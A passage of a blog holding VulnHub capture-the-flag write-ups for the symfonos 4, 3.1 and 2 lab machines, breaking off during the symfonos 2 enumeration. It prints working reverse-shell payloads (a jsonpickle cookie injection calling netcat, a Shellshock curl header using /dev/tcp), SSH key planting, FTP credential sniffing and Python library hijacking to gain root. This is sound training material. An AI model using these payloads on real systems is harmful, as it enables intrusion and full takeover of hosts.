malicious <span class="o">=</span> <span class="s1">'{"1": {"py/repr": "time/time.sleep(10)"}, "2": {"py/id": 67}}'</span>
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="jsonpickle-module">Jsonpickle Module</h3>

<p>First we intercept the web page request, and send it to repeater.</p>

<p><img src="/assets/images/symfonos4/screenshot-9.png" alt="" /></p>

<p><img src="/assets/images/symfonos4/screenshot-10.png" alt="" />
If we notice the cookie value is encoded in base64, we decode it and see that the data is in json format.</p>

<p><img src="/assets/images/symfonos4/screenshot-11.png" alt="" /></p>

<p>Then we modify the data slightly according to the specifications of the proof of concept, we import the os module and then we use the system method to execute commands from the system, in this case the netcat utility to obtain a reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">username</span><span class="o">={</span><span class="s2">"py/object"</span>: <span class="s2">"app.User"</span>, <span class="s2">"py/repr"</span>:<span class="s2">"os/os.system(</span><span class="se">\"</span><span class="s2">nc 192.168.179.1 443 -c bash</span><span class="se">\"</span><span class="s2">)"</span><span class="o">}</span>
</code></pre></div></div>
<p><img src="/assets/images/symfonos4/screenshot-12.png" alt="" /></p>

<p>After we return to encode the data in base64, set up a netcat listener and finally sent the request.</p>

<p><img src="/assets/images/symfonos4/screenshot-13.png" alt="" /></p>

<p>As we can see we get a shell with root privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.138] 58344
<span class="nb">uname</span> <span class="nt">-a</span>
Linux symfonos4 4.19.0-5-686 <span class="c">#1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) i686 GNU/Linux</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - symfonos 3.1</h1>
	<p class="post-date text-bold text-upcase">
	<span>June 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Intermediate real life based machine designed to test your skill at enumeration.</p>

<p><strong>Author:</strong> Zayotic</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/symfonos-31,332/">https://www.vulnhub.com/entry/symfonos-31,332/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>We begin by discovering our target machine on the local network, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-15 16:16 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.137
Host is up <span class="o">(</span>0.00072s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:0C:29:B7:54:77 <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00074s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:FF:79:31 <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>6.75 seconds
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Ones our target has been located, it’s time to perform a TCP and UDP port scan, for this we use unicornscan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-Iv</span> <span class="nt">-mT</span> <span class="nt">-p1-65535</span> 192.168.179.137 <span class="o">&amp;&amp;</span> us <span class="nt">-Iv</span> <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.137
...
TCP open                     ftp[   21]         from 192.168.179.137  ttl 64
TCP open                     ssh[   22]         from 192.168.179.137  ttl 64 
TCP open                    http[   80]         from 192.168.179.137  ttl 64
...
</code></pre></div></div>
<p>In the results we can see three open TCP ports, the scanned UDP ports were false positives, so I skipped them.</p>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>Then I start by enumerating the versions and services of the open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,22,80 <span class="nt">-Pn</span> 192.168.179.137 <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 <span class="nb">cd</span>:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c <span class="o">(</span>RSA<span class="o">)</span>
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
MAC Address: 00:0C:29:B7:54:77 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
...
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>Since anonymous login is not enabled in the ftp service, I proceed to browse the web service on port 80.</p>

<p><img src="/assets/images/symfonos3/screenshot-1.png" alt="" /></p>

<p>But I don’t find anything interesting, so I run gobuster to find hidden directories and files.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> txt,sql,html,php
...
http://192.168.179.137/gate                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.137/gate/]
http://192.168.179.137/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 280] 

</code></pre></div></div>
<p>The tool found the <strong>gate</strong> directory, so I try to access it with the browser.</p>

<p><img src="/assets/images/symfonos3/screenshot-2.png" alt="" /></p>

<p>In the same way I can’t find anything, so I try to enumerate the <strong>gate</strong> directory and locate the <strong>cerberus</strong> directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137/gate/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> txt,sql,html,php
...
http://192.168.179.137/gate/cerberus             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 326] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.137/gate/cerberus/]
</code></pre></div></div>

<p><img src="/assets/images/symfonos3/screenshot-3.png" alt="" /></p>

<p>After wasting time trying to list these directories and falling down a rabbit hole I decide to use the dirb wordlist.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-e</span> txt,sql,html,php
...
http://192.168.179.137/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 280]
http://192.168.179.137/gate                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.137/gate/]
http://192.168.179.137/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 241]                                   
http://192.168.179.137/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 280] 
...
</code></pre></div></div>
<p>I find a suspicious <strong>cgi-bin</strong>, I access it but nothing, the directory listing is not enabled.</p>

<p><img src="/assets/images/symfonos3/screenshot-4.png" alt="" /></p>

<p>I run gobuster to keep enumerating through the <strong>cgi-bin</strong> and finally I find the <strong>underworld</strong> resource, a potencial shellshock vulnerability.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137/cgi-bin/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> txt,php
...
http://192.168.179.137/cgi-bin/underworld           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 62]

</code></pre></div></div>

<p><img src="/assets/images/symfonos3/screenshot-5.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="shellshock">Shellshock</h3>

<p>Shellshock is a vulnerability relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable.</p>

<p>Knowing what shellshock is, let’s proceed to exploit it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; /bin/bash -c 'id'"</span> http://192.168.179.137/cgi-bin/underworld
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>,1003<span class="o">(</span>pcap<span class="o">)</span>
</code></pre></div></div>

<p>As we can see, it’s indeed vulnerable and we have been able to execute the <strong>id</strong> command.</p>

<p><strong>Getting a reverse shell</strong></p>

<p>I first set up a netcat listener on the attacking machine and then run the following curl instruction:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1'"</span> http://192.168.179.137/cgi-bin/underworld
</code></pre></div></div>

<p>As we can see, we have a limited shell of the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.137] 56878
bash: no job control <span class="k">in </span>this shell
cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">hostname</span><span class="p">;</span> <span class="nb">uname</span> <span class="nt">-a</span>
symfonos3
Linux symfonos3 4.9.0-9-amd64 <span class="c">#1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux</span>
</code></pre></div></div>

<p>One way to get a full shell is to write a public key to the cerberus home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">grep </span>cerberus /etc/passwd
cerberus:x:1001:1001:,,,:/home/cerberus:/bin/bash
</code></pre></div></div>

<p>We first generate a key pair with <strong>ssh-keygen</strong>, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s1">'s4rgaz&amp;'</span> <span class="nt">-f</span> id_rsa
</code></pre></div></div>

<p>Then we create the <strong>.ssh</strong> directory in his home, and redirect the public key to the <strong>authorized_keys</strong> file inside the <strong>.ssh</strong> directory.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">mkdir</span> /home/cerberus/.ssh
cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnazZnt1nwwEQxd1JedANYuZWEiG4+ozHEwC1vpoaDokYbXUuICTFlKPVl6Z44vf6pcGiX8uRER3JADLhU4Oykijgm9filhWLWUX4m9f8oDFYG0WEA6qTjgkHSoty9ySyZ8byxvY9/CNJDl6spe/U1GiLkNmjRhalGxk2xaNvzu3d7UmGKoIPJPzvA3k3PDPQCYLvHIBllFUqFqz4o6S+to6R7CFE1jmPbyZNW5tX9ji5IDFc5Aa0N6ZjpIt+sh5F+EKdoydpHiwwKx3XSp4MdGKuDjTKdG07LeRX5MRLc2M6goPiQvpiVLPFUjmAb4K/vQ9y3VLSOiraE7hTW0Mf1gvNLhRru/wGnm/Sy8RExc1kmMYwPJQPo5PluplJMMaKp3AoEeanTKF6zyJKaiqakKUVfnj5eHQ2Xely+hKCLWp7Bbxmex6TXHb+jTgbuCJnA+L1Uj6ssM6md8uVJtz1He3G7ZGZDbDoAAeXON34t0x1bWCZgp/nw0bjS8Va7EWM='</span> <span class="o">&gt;</span> /home/cerberus/.ssh/authorized_keys
</code></pre></div></div>

<h3 id="access-via-ssh">Access via SSH</h3>

<p>We access via ssh with the private key, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh cerberus@192.168.179.137 <span class="nt">-i</span> id_rsa
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>:
cerberus@symfonos3:~<span class="nv">$ </span><span class="nb">whoami
</span>cerberus
cerberus@symfonos3:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>,1003<span class="o">(</span>pcap<span class="o">)</span>
</code></pre></div></div>
<p>After listing the system I realize that the cerberus user belongs to the group pcap, we can possibly use a sniffer and thus analyze the traffic, first start by listing the network interfaces.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:~<span class="nv">$ </span>ip addr
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    <span class="nb">link</span>/ether 00:0c:29:b7:54:77 brd ff:ff:ff:ff:ff:ff
    inet 192.168.179.137/24 brd 192.168.179.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:feb7:5477/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
</code></pre></div></div>

<p>As we can see, there are only two network interfaces, so I try to sniff the loopback interface and write the packets to the pcap file, then I stop the capture and analyzing the packets, I found the hades user login credentials at FTP service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:~<span class="nv">$ </span>tcpdump <span class="nt">-i</span> lo <span class="nt">-w</span> capture.pcap
cerberus@symfonos3:~<span class="nv">$ </span>tcpdump <span class="nt">-r</span> capture.pcap | <span class="nb">grep</span> <span class="nt">-io</span> <span class="s1">'user.*\|pass.*'</span>
reading from file capture.pcap, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
USER hades
Password required <span class="k">for </span>hades
PASS PTpZTfU4vxgzvRBE
User hades logged <span class="k">in</span>
</code></pre></div></div>

<p>Then I switch to the hades user with the credentials found, and I find the script that was authenticating to the FTP service, I dedicate that a cron job is executing the script every certain period of time.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:~<span class="nv">$ </span>su hades
Password: 
hades@symfonos3:/home/cerberus<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>hades<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>hades<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>hades<span class="o">)</span>,1002<span class="o">(</span>gods<span class="o">)</span>
hades@symfonos3:/home/cerberus<span class="nv">$ </span><span class="nb">cd</span> /opt/ftpclient/
hades@symfonos3:/opt/ftpclient<span class="nv">$ </span><span class="nb">ls
</span>ftpclient.py  statuscheck.txt
hades@symfonos3:/opt/ftpclient<span class="nv">$ </span><span class="nb">cat </span>ftpclient.py 
import ftplib

ftp <span class="o">=</span> ftplib.FTP<span class="o">(</span><span class="s1">'127.0.0.1'</span><span class="o">)</span>
ftp.login<span class="o">(</span><span class="nv">user</span><span class="o">=</span><span class="s1">'hades'</span>, <span class="nv">passwd</span><span class="o">=</span><span class="s1">'PTpZTfU4vxgzvRBE'</span><span class="o">)</span>

ftp.cwd<span class="o">(</span><span class="s1">'/srv/ftp/'</span><span class="o">)</span>

def upload<span class="o">()</span>:
    filename <span class="o">=</span> <span class="s1">'/opt/client/statuscheck.txt'</span>
    ftp.storbinary<span class="o">(</span><span class="s1">'STOR '</span>+filename, open<span class="o">(</span>filename, <span class="s1">'rb'</span><span class="o">))</span>
    ftp.quit<span class="o">()</span>

upload<span class="o">()</span>
</code></pre></div></div>

<p>Listing writable directories, I find an interesting directory <strong>/usr/lib/python2.7</strong>, this is where the modules that import python scripts reside.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hades@symfonos3:/opt/ftpclient<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null
/srv/ftp                                                         
/usr/lib/python2.7                                           
/dev/mqueue                                                    
/dev/shm                                                      
/var/lib/php/sessions                                    
/var/tmp       
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="python-library-hijacking">Python Library Hijacking</h3>
<p>Since we have write permissions in this directory, we try to modify the <strong>ftplib.py</strong> module, first we create a copy of this module and then we write a reverse shell inside the ftplib.py file, which at the moment the script is executed will import our module with the reverse shell, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hades@symfonos3:/usr/lib/python2.7<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-1</span> | <span class="nb">grep</span> ^ft
ftplib.py
ftplib.pyc
hades@symfonos3:/usr/lib/python2.7<span class="nv">$ </span><span class="nb">mv </span>ftplib.py ftplib.py.old
hades@symfonos3:/usr/lib/python2.7<span class="nv">$ </span>nano ftplib.py 
</code></pre></div></div>
<p><img src="/assets/images/symfonos3/screenshot-6.png" alt="" /></p>

<p>After we set up a netcat listener and after a moment we have a reverse shell with root permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443 
listening on <span class="o">[</span>any] 443 ... 
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.137] 45092
bash: no job control <span class="k">in </span>this shell 
root@symfonos3:~# <span class="nb">whoami  
</span>root    
root@symfonos3:~# <span class="nb">hostname 
</span>symfonos3
root@symfonos3:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - symfonos 2</h1>
	<p class="post-date text-bold text-upcase">
	<span>June 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> OSCP-like Intermediate real life based machine designed to teach the importance of understanding a vulnerability.</p>

<p><strong>Author:</strong> Zayotic</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/symfonos-2,331/">https://www.vulnhub.com/entry/symfonos-2,331/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>With netdiscover we start by locating our target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24 
 Currently scanning: Finished!   |   Screen View: Unique Hosts  
                                                              
 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222  
 _________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
 <span class="nt">-------------------------------------------------------------------------</span>
 192.168.179.136 00:0c:29:35:84:08      3     180  VMware, Inc. 
 192.168.179.254 00:50:56:e4:fa:35      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Our identified target, I proceed to perform a TCP port scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-p-</span> <span class="nt">-T5</span> 192.168.179.136 <span class="nt">-oG</span> nmap-tcp-all-ports.txt
...
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 64
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 00:0C:29:35:84:08 <span class="o">(</span>VMware<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>Then I perform a service enumeration of the open TCP ports with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p21</span>,22,80,139,445 192.168.179.136 <span class="nt">-oG</span> tcp-service-enum.txt
...
PORT    STATE SERVICE     REASON         VERSION                                                                                                                   
21/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.3.5                                                                                                             
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                                             
| ssh-hostkey:                                                                                                                                                     
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Cvyjh+QnQHsoZt3FqnW8JazNn1CYvc7uuArLkDPM25xV8l4Jc7Xw9InhmSFKJJD0mXhLALt/9byLeH7CyBEjpKATbSsEIL1iQ7G7ETmuOdZPfZxRnLhmaf1cv
UxLapJQ5B3z67VR0PxvjfDk/0ARPAhKu1CuPmZk/y4t2iu8RKHG86j5jzR0KO3o2Aqsb2j+7XOd4IDCSFuoFiP3Eic/Jydtv73pyo+2JxBUvTSLaEtqe1op8sLP8wBFRX4Tvmqz/6zO1/zivBjBph8XMlzuMkMC8la8
/XJmPb8U5C/8zfogG+YwycTw6ul7616PIj2ogPP89uyrTX9dM3RuZ9/1                                                                                                           
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXypIGuum1SlMddq/BrUwIZM1sRIgbzdijCa1zYunAAT+uKTwPGaKO7e9RxYu97+ygLgpuRMthojpUlOgOVGOA<span class="o">=</span> 
|   256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILluhq57UWA4q/mo/h6CjqWMpMOYB9VjtvBrHc6JsEGk                                                                                 
80/tcp  open  http        syn-ack ttl 64 WebFS httpd 1.21                                                                                                          
| http-methods:                                                                                                                                                    
|_  Supported Methods: GET HEAD                                                                                                                                    
|_http-server-header: webfs/1.21                                                                                                                                   
|_http-title: Site doesn<span class="s1">'t have a title (text/html).                                                                                                               
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                               
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
...
</span></code></pre></div></div>

<h3 id="samba-enumeration">Samba Enumeration</h3>
<p>Later I enumerate the samba service and find the <strong>anonymous</strong> shared folder and the <strong>aeolus</strong> and <strong>cronus</strong> users, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.136
...
 <span class="o">============================================</span> 
|    Share Enumeration on 192.168.179.136    |
 <span class="o">============================================</span> 

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        anonymous       Disk      
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>Samba 4.5.16-Debian<span class="o">)</span>
SMB1 disabled <span class="nt">--</span> no workgroup available

<span class="o">[</span>+] Attempting to map shares on 192.168.179.136
//192.168.179.136/print<span class="nv">$ </span>       Mapping: DENIED, Listing: N/A
//192.168.179.136/anonymous     Mapping: OK, Listing: OK
//192.168.179.136/IPC<span class="nv">$ </span> <span class="o">[</span>E] Can<span class="s1">'t understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\aeolus (Local User)
S-1-22-1-1001 Unix User\cronus (Local User)
</span></code></pre></div></div>
<p>Then I log in to the anonymous shared folder with a null session, I find the <strong>backups</strong> folder and it contains a <strong>log.txt</strong> file, I download it to check what it may contain.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbclient //192.168.179.136/anonymous <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>      
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu Jul 18 09:30:09 2019
  ..                                  D        0  Thu Jul 18 09:29:08 2019
  backups                             D        0  Thu Jul 18 09:25:17 2019

                19728000 blocks of size 1024. 16313728 blocks available
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>backups
smb: <span class="se">\b</span>ackups<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu Jul 18 09:25:17 2019
  ..                                  D        0  Thu Jul 18 09:30:09 2019
  log.txt                             N    11394  Thu Jul 18 09:25:16 2019

                19728000 blocks of size 1024. 16313728 blocks available
smb: <span class="se">\b</span>ackups<span class="se">\&gt;</span> get log.txt
getting file <span class="se">\b</span>ackups<span class="se">\l</span>og.txt of size 11394 as log.txt <span class="o">(</span>247.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 247.3 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\b</span>ackups<span class="se">\&gt;</span> quit
</code></pre></div></div>
<p>The <strong>log.txt</strong> file contains the command for a copy of the shadow file, the configuration of the samba and proftpd services, with this we can outline our next attack vector.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>log.txt
root@symfonos2:~# <span class="nb">cat</span> /etc/shadow <span class="o">&gt;</span> /var/backups/shadow.bak
root@symfonos2:~# <span class="nb">cat</span> /etc/samba/smb.conf
...
<span class="o">[</span>anonymous]
   path <span class="o">=</span> /home/aeolus/share
   browseable <span class="o">=</span> <span class="nb">yes
